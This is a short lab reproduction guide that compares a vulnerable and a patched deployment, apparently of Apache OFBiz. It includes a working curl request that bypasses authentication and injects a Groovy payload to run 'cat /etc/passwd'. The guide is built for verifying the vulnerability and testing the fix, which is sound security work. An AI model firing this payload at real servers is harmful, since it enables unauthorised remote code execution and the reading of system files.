# Reproduction Guide

## Vulnerable Version
### Step 1 – Start the Lab Environment
Start all required containers with Docker Compose using `docker-compose.yml`:

```bash
docker-compose -f docker-compose.yml up -d
```

### Step 2 – Verify the Vulnerability
Issue the following HTTP request to the local instance:
```bash
curl "https://localhost:8443/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y" -d "groovyProgram=throw+new+Exception('cat /etc/passwd'.execute().text);" -k -v
```
The response body should contains `root:x:`.

## Not Vulnerable Version
### Step 1 – Start the Lab Environment
Start all required containers with Docker Compose using `docker-compose-secure.yml`:

```bash
docker-compose -f docker-compose-secure.yml up -d
```

### Step 2 – Verify the Vulnerability
Issue the following HTTP request to the local instance:
```bash
curl "https://localhost:8443/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y" -d "groovyProgram=throw+new+Exception('cat /etc/passwd'.execute().text);" -k -v
```
The response body should NOT contains `root:x:`.
